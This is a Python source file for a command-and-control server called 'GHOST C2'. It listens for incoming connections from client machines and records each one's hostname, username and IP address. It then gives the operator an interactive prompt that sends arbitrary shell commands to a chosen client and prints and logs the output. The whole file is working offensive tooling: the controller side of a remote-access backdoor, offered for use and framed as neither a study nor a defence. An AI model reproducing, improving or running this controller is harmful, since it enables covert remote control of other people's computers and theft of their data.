import socket
import logging
import os
import json
import time

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════════╗
    ║                    👻 GHOST C2 🥷                         ║
    ╠═══════════════════════════════════════════════════════════╣
    ║               https://github.com/PiAirLika                ║
    ╚═══════════════════════════════════════════════════════════╝                                                                       
        """
    print(banner)

def show_menu():
    print("\n[1] Start Server")
    print("[2] View registered clients")
    print("[3] Connect to a client")
    print("[4] Quit")
    
    while True:
        choice = input("\nChoice : ")
        if choice in ['1', '2', '3', '4']:
            return choice
        print("Invalid option.")

def start_server(server_socket, existing_clients):
    duration = 15  # Listening Duration in Seconds
    new_clients = {}
    
    try:
        print(f"\033[93mServer waiting for connection...\033[0m")
        print(f"\033[96mListening for {duration} seconds...\033[0m")

        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                server_socket.settimeout(1)
                client_socket, client_address = server_socket.accept()
                client_socket.settimeout(None)
                print(f"\033[91mNew connection from {client_address}...\033[0m")
                
                try:
                    response_size = int(client_socket.recv(1024).decode())
                    client_socket.send(b'ACK')
                    info_data = client_socket.recv(response_size).decode()

                    if info_data.startswith("INFO:"):
                        client_info = json.loads(info_data[5:])
                        save_client_info(client_info)
                        client_id = client_info['hostname']
                        
                        if client_id in existing_clients:
                            print(f"\033[93mClient {client_id} already connected\033[0m")
                            client_socket.close()
                            continue
                        
                        new_clients[client_id] = {
                            'socket': client_socket,
                            'address': client_address,
                            'info': client_info
                        }
                        print(f"\033[95mNew registered client : {client_id}\033[0m")
                except Exception as e:
                    print(f"\033[91mError when receiving information : {e}\033[0m")
                    client_socket.close()
                    continue
                
            except socket.timeout:
                remaining = int(duration - (time.time() - start_time))
                if remaining > 0:
                    print(f"\rTime remaining: {remaining} seconds...\n", end="", flush=True)
                continue
            except KeyboardInterrupt:
                break

        print("\n\n=== Listening duration ended ===")
        all_clients = {**existing_clients, **new_clients}
        if all_clients:
            print("Connected Clients :")
            for i, (client_id, data) in enumerate(all_clients.items(), 1):
                print(f"[{i}] {client_id} ({data['address'][0]})")
        else:
            print("No connected clients")
        print("=" * 30)

    except Exception as e:
        print(f"\033[91mError while listening: {e}\033[0m")
    
    return new_clients

def connect_to_client(connected_clients):
    if not connected_clients:
        print("\033[91mNo clients connected\033[0m")
        return

    print("\nConnected Clients:")
    for i, (client_id, client_data) in enumerate(connected_clients.items(), 1):
        print(f"[{i}] {client_id} ({client_data['address'][0]})")

    while True:
        try:
            choice = int(input("\nChoose a client (number) : "))
            if 1 <= choice <= len(connected_clients):
                client_id = list(connected_clients.keys())[choice - 1]
                client_data = connected_clients[client_id]
                handle_client_connection(client_data['socket'], client_id)
                break
            else:
                print("Invalid choice")
        except ValueError:
            print("Veuillez entrer un numéro valide")

def handle_client_connection(client_socket, client_id):
    print(f"\033[93mConnected to : {client_id}\033[0m")
    print("\033[93mtype 'exit' to close\033[0m")

    putlog = input("\033[92mKeep logs ? (y/n) : \033[0m")
    if putlog.lower() == "y":
        putlog = 1
        print("Logs Enabled")
        logging.basicConfig(
            filename="logs\\logs.txt",
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
    else:
        putlog = 0
        print("Logs Disabled")

    while True:
        try:
            command = input("\033[92m>>> \033[0m")
            client_socket.send(command.encode())

            if command.lower() == 'exit':
                print("Closing connection...")
                clear_screen()
                show_banner()
                break

            try:
                response_size = int(client_socket.recv(1024).decode())
            except ValueError:
                print("Error: invalid response size received.")
                continue

            client_socket.send(b'ACK')

            response_data = b""
            while len(response_data) < response_size:
                chunk = client_socket.recv(1024)
                if not chunk:
                    break
                response_data += chunk

            output = response_data.decode()
            print(output)

            if putlog == 1:
                log_command(command, output)

        except Exception as e:
            print(f"\033[91mError during communication : {e}\033[0m")
            break

def log_command(command, output):
    output_cleaned = output.strip()
    logging.info(f"Command executed : {command}")
    logging.info(f"Output : {output_cleaned}")

def save_client_info(client_info):
    try:
        json_path = os.path.join('computers', 'computers.json')
        if not os.path.exists('computers'):
            os.makedirs('computers')
            
        if os.path.exists(json_path):
            with open(json_path, 'r') as f:
                data = json.load(f)
        else:
            data = {"clients": []}

        existing_client = None
        for client in data["clients"]:
            if (client["ip"] == client_info["ip"] and 
                client["hostname"] == client_info["hostname"] and
                client["username"] == client_info["username"]):
                existing_client = client
                break

        if existing_client:
            existing_client.update(client_info)
            
            data["clients"] = [
                c for c in data["clients"] 
                if not (c["ip"] == client_info["ip"] and 
                       c["hostname"] == client_info["hostname"] and
                       c["username"] == client_info["username"] and
                       c["id"] != client_info["id"])
            ]
        else:
            data["clients"].append(client_info)

        with open(json_path, 'w') as f:
            json.dump(data, f, indent=4)
            
    except Exception as e:
        print(f"Error saving client information : {e}")

def show_clients():
    try:
        with open('computers/computers.json', 'r') as f:
            data = json.load(f)

        if not data.get('clients'):
            print("\nNo clients registered.")
            return

        print("\nRegistered Clients :")
        
        for i, client in enumerate(data['clients'], 1):
            print(f"\nClient #{i}")
            print(f"ID : {client['id']}")
            print(f"Username : {client['username']}")
            print(f"Hostname : {client['hostname']}")
            print(f"IP Adress : {client['ip']}")

        input("\nPress enter for continue...")
    
    except FileNotFoundError:
        print("\n No registered client.")
    except Exception as e:
        print("\nError : {e}")

def main():
    clear_screen()
    show_banner()
    
    host = '0.0.0.0'
    port = 12345
    connected_clients = {}
    server_socket = None
    
    try:
        while True:
            choice = show_menu()
            
            if choice == '1':
                clear_screen()
                show_banner()
                if server_socket:
                    server_socket.close()
                
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.bind((host, port))
                server_socket.listen(5)
                
                new_clients = start_server(server_socket, connected_clients)
                connected_clients.update(new_clients)
                
            elif choice == '2':
                clear_screen()
                show_clients()
                clear_screen()
                show_banner()
            elif choice == '3':
                clear_screen()
                show_banner()
                connect_to_client(connected_clients)
            elif choice == '4':
                print("\nGood Bye !")
                break
                
    except Exception as e:
        print(f"\nError : {e}")
    finally:
        for client_data in connected_clients.values():
            try:
                client_data['socket'].close()
            except:
                pass
        if server_socket:
            server_socket.close()
        print("Server closed.")

if __name__ == "__main__":
    main()
